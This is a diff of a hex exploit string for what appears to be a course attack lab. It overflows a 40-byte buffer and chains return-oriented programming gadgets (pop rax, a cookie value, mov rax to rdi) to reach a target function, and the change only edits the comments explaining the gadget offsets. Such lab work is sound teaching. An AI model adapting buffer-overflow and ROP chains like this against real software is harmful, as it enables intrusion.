@@ -1,5 +1,5 @@
 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 /* fill in the 40 slots in the getbuf buffer */
-ab 19 40 00 00 00 00 00 /* return address to the addval_219 gadget for the popq rax and nop */
+ab 19 40 00 00 00 00 00 /* return address to the addval_219 plus some bias, the low byte is ab, for popq rax and nop */
 fa 97 b9 59 00 00 00 00 /* the cookie data */
-c5 19 40 00 00 00 00 00 /* return address to the setval_426 gadget for the movq rax rdi and nop */
+c5 19 40 00 00 00 00 00 /* return address to the setval_426 plus some bias, the low byte is c5,  for movq rax rdi and nop */
 ec 17 40 00 00 00 00 00 /* return address to the touch2 */
